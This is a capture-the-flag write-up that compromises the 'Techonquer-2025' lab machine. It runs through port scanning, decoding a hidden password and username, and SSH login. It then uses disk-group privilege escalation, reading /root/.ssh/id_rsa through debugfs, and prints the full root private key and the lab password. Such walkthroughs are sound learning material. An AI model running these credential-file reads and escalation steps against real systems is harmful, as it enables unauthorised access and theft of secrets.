# Techonquer - 2025

#### **Introduction**

This document details my step-by-step process for compromising the "Techonquer-2025" machine. The challenge presented a multi-layered path, beginning with web enumeration and steganography, moving through a deliberately misleading web application, and culminating in an unconventional privilege escalation. This writeup will serve as a technical log of the commands, outputs, and thought processes used to achieve root access.

***

### **Phase 1: Initial Reconnaissance & Enumeration**

My process began with a full TCP port scan to map the attack surface, as initial targeted scans can miss critical, non-standard services.

**Command:**

```bash
nmap -p- 10.10.234.245
```

This initial scan was noisy but confirmed that port **9090** was open. I then performed a detailed service scan on this port to gather more intelligence.

**Command:**

```bash
nmap 10.10.234.245 -p 9090 -A -sV -sC --script=vuln
```

**Output:**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 19:25 IST
Nmap scan report for 10.10.234.245
Host is up (0.21s latency).

PORT     STATE SERVICE VERSION
9090/tcp open  http    Apache httpd
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /robots.txt: Robots file
|_  /robots/: Potentially interesting folder w/ directory listing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 (96%), Linux 2.6.32 - 3.10 (94%), Linux 3.2 - 4.14 (94%), Linux 4.15 - 5.19 (94%), Linux 5.4 (92%), Linux 2.6.32 - 3.5 (92%), Linux 2.6.32 - 3.13 (91%), Linux 5.0 - 5.14 (91%), Android 9 - 10 (Linux 4.9 - 4.14) (91%), Android 10 - 12 (Linux 4.14 - 4.19) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   231.38 ms 10.17.0.1
2   ... 4
5   375.26 ms 10.10.234.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.66 seconds

```

With a web server confirmed, I initiated directory enumeration with `gobuster` to discover hidden content.

**Command:**

```bash
gobuster dir -u http://10.10.234.245:9090 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,sh,js
```

**Output:**

```bash
/robots               (Status: 301) [--> http://10.10.234.245:9090/robots/]
/robots.html          (Status: 200)
/robots.txt           (Status: 200)
```

First I visited the `/robots.txt` and it told me "try with extensions haha" which I did not understood&#x20;

This left me with two paths to investigate: the `/robots/` directory and the `/robots.html` page. I began with the directory, where I found two files: `hello.zip` and `hii.png`.

***

### **Phase 2: Analysis of Dropped Files**

These files were clearly not standard and required further analysis.

**Clue #1: The Password from `hello.zip`**

Attempting to decompress the file failed, indicating it was not a valid zip archive. I treated it as a raw data file and extracted the embedded strings.

**Command:**

```bash
strings hello.zip
```

**Output:**

```
FT9jMIyiqIqcoTkZnJgyITuyD2uuoTkuozqyDQRmZmp=
```

The output was a Base64 string. I used CyberChef to decode it.

***

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

***

**Decoded Password:** `HopeYouWillLikeTheChallange@1337`

**Clue #2: The Username from `hii.png`**

The `hii.png` file was similarly deceptive. A hexadecimal analysis revealed it was not an image but a text file containing a repeating pattern of ASCII characters for dash, dot, and space. It was Morse code. I again used CyberChef to decode the entire file content.

```bash
xxd hii.png | head
```

```bash
00000000: 3264 2032 6420 3264 2032 6420 3264 2032  2d 2d 2d 2d 2d 2
00000010: 3020 3265 2032 6420 3264 2032 6420 3264  0 2e 2d 2d 2d 2d
00000020: 2032 3020 3264 2032 6420 3264 2032 6420   20 2d 2d 2d 2d 
00000030: 3264 2032 3020 3265 2032 6420 3264 2032  2d 20 2e 2d 2d 2
00000040: 6420 3264 2032 3020 3265 2032 6420 3264  d 2d 20 2e 2d 2d
00000050: 2032 6420 3264 2032 3020 3264 2032 6420   2d 2d 20 2d 2d 
00000060: 3264 2032 6420 3264 2032 3020 3265 2032  2d 2d 2d 20 2e 2
00000070: 6420 3264 2032 6420 3264 2032 3020 3265  d 2d 2d 2d 20 2e
00000080: 2032 6420 3264 2032 6420 3264 2032 3020   2d 2d 2d 2d 20 
00000090: 3265 2032 6520 3265 2032 6520 3265 2032  2e 2e 2e 2e 2e 2
```

Which I decoded using CyberChef

The output was a lengthy conversation, providing vital context about a security breach and mentioning a key username.

<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Decoded Conversation:**

```
[02:12] You: Aster, pick up! Emergency.
[02:12] You: The repo was hacked.
[02:13] Aster: …what? Are you serious?
[02:13] You: Dead serious. Data is leaking right now.
[02:14] Aster: Which repo? The main codebase?
[02:14] You: Yes. All branches. History is defaced.
[02:15] Aster: Fck. Did you revoke tokens yet?
[02:15] You: Already revoked mine. Still digging for others.
[02:16] Aster: Okay, check GitHub audit logs first.
[02:16] You: Logs look tampered. Someone deleted events.
[02:17] Aster: That means they had admin access.
[02:17] You: Exactly. Keys must’ve leaked earlier.
[02:18] Aster: Did prod get touched?
[02:18] You: Seeing unusual API calls around midnight.
[02:19] Aster: Sht. Could be exfil.
[02:19] You: They left a commit saying “nice code lol”.
[02:20] Aster: Mocking us too. Perfect.
[02:20] You: Screenshots of our dashboard are already online.
[02:21] Aster: Where?
[02:21] You: Some paste site. Random Twitter accounts are linking it.
[02:22] Aster: Okay, stop. We need containment first.
[02:22] You: I’m pulling network logs.
[02:23] Aster: I’ll handle secrets rotation.
[02:23] You: Cloud tokens too?
[02:24] Aster: Everything. Assume it’s all burned.
[02:24] You: Team lead won’t like this.
[02:25] Aster: They’ll like it less if prod is gone.
[02:25] You: True. Should I ping legal?
[02:26] Aster: Not yet. We need facts first.
[02:26] You: Okay, scanning CI/CD logs now.
[02:27] Aster: Watch for persistence—rogue pipelines.
[02:27] You: Found one. “build_patch_99”. Not ours.
[02:28] Aster: Kill it immediately.
[02:28] You: Done. Still paranoid.
[02:29] Aster: Good. Keep hunting.
[02:29] You: Our backup snapshots look intact.
[02:30] Aster: Then we can recover. Focus on plugging leaks.
[02:30] You: This feels targeted. Not random.
[02:31] Aster: Yeah, they knew too much.
[02:31] You: Internal compromise?
[02:32] Aster: Could be. Or long-term recon.
[02:32] You: Either way—we’re screwed.
[02:33] Aster: Not screwed. Just bleeding.
[02:33] You: Great pep talk, thanks.
[02:34] Aster: Hey, we’ve patched worse.
[02:34] You: I’ll notify ops to isolate servers.
[02:35] Aster: I’ll draft the incident timeline.
[02:35] You: Okay… but this night’s not ending soon.
[02:36] Aster: Welcome to breach response.
```

This provided the username: **Aster**. I now had a complete set of credentials.

***

### **Phase 3: The `robots.html` Rabbit Hole**

The `robots.html` page led to a simulated terminal. My initial hypothesis was a web shell, but tests for command injection failed, proving it was a sandboxed environment. The entire application was a JavaScript puzzle. After identifying a logic flaw in the page's code, I escalated my privileges. But it was of no use just to waste our time.

**Command:**

```bash
user@ctf-terminal:~$ ls ; whoami
```

**Output:**

```bash
ls: cannot access ';': No such file or directory
ls: cannot access 'whoami': No such file or directory
```

***

### **Phase 4: Gaining a Foothold**

An attempt to connect to the default SSH port 22 failed with a `Connection closed` error, indicating a decoy. A full scan was necessary to find the real port. So made a custom Python script using AI and identified the service was running on port **65530**.

```bash
python3 ssh-scanner.py
[*] Starting optimized SSH scan on 10.10.92.86 with 50 threads...

[SUCCESS] Found hidden SSH server!
    -> Port: 65530
```

My first login attempt with `aster` failed. Recalling the capitalization in the chat log, I tried `Aster`.

**Command:**

```bash
ssh Aster@10.10.92.86 -p 65530
```

**Output:**

```bash
Aster@10.10.92.86's password: HopeYouWillLikeTheChallange@1337
Welcome to Ubuntu 22.04.5 LTS...
Aster@ubuntu:~$
```

I had successfully gained initial access.

***

### **Phase 5: Escaping rbash & Privilege Escalation**

Upon gaining initial access, it was immediately apparent that I was not in a standard shell. The behaviour was consistent with a restricted environment, specifically `rbash`. My first priority was to confirm the nature and limitations of this jail before attempting any privilege escalation.

I began by testing the core restrictions of `rbash`.

First, I confirmed that commands containing slashes were forbidden, a hallmark of a restricted shell. The `ls` command worked, but specifying its full path did not. This proved I could only run binaries within the limited `PATH` provided.

Next, I attempted to redirect output, which is another common restriction.

**Command:**

```bash
Aster@ubuntu:~$ cat .profile > test
```

**Output:**

```
-rbash: test: restricted: cannot redirect output
```

This failure was definitive proof of a restricted shell. The final confirmation came from checking the environment variables.

**Command:**

```bash
Aster@ubuntu:~$ env
```

**Output (Relevant Line):**

```
SHELL=/bin/rbash
PWD=/home/Aster
LOGNAME=Aster
HOME=/home/Aster
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

The `SHELL=/bin/rbash` variable left no doubt. My objective now shifted from standard enumeration to escaping or bypassing this jail

To bypass `rbash` I referred this article : [https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)

My next step was to understand what permissions my own user, `Aster`, possessed.

**Command:**

```bash
Aster@ubuntu:~$ id
```

**Output:**

```
uid=1001(Aster) gid=1001(Aster) groups=1001(Aster),6(disk)
```

This was critical. The user `Aster` is a member of the **`disk`** group. This is a severe misconfiguration that grants the user raw read/write access to the system's block devices (like `/dev/sda` or `/dev/nvme0n1p3`), effectively bypassing all filesystem-level permissions.

I knew this was a known privilege escalation vector. I referenced an excellent article from **Hacking Articles** on the topic to confirm the exact methodology.

* **Reference:** [Disk Group Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/disk-group-privilege-escalation/)

The article confirmed that the `debugfs` utility could be used to open the raw disk device and read any file, regardless of my user's permissions on that file. The target was clear: the root user's private SSH key.

I executed `debugfs` on the primary partition, `/dev/nvme0n1p3`. Inside the `debugfs` interactive shell, I used the `cat` command to read the contents of `/root/.ssh/id_rsa`.

**Command & Output Sequence:**

```bash
debugfs /dev/nvme0n1p3
```

```bash
debugfs 1.46.5 (30-Dec-2021)
debugfs:  mkdir test
mkdir: Filesystem opened read/only
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
0wcrdoL/GYOz0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
debugfs:
```

***

### **Phase 6: Achieving Root & Capturing the Flag**

I saved the key locally as `id_rsa`. My first attempt to use it failed due to insecure file permissions.

**Command & Output:**

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa root@10.10.42.32 -p 65530
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0660 for 'id_rsa' are too open.
```

I corrected the permissions and made the final connection.

**Command:**

```bash
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa
```

**Command:**

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa root@10.10.42.32 -p 65530
```

**Output:**

```bash
Welcome to Ubuntu 22.04.5 LTS...
root@ubuntu:~#
```

With root access achieved, I located and read the final flag.

**Command:**

```bash
root@ubuntu:~# cat pwned.txt
```

**Output:**

```
xTech{Thanks_for_playing}
```

Also the Priv esc might be possible using pkexec too.

Thankyou for Reading ☺️.
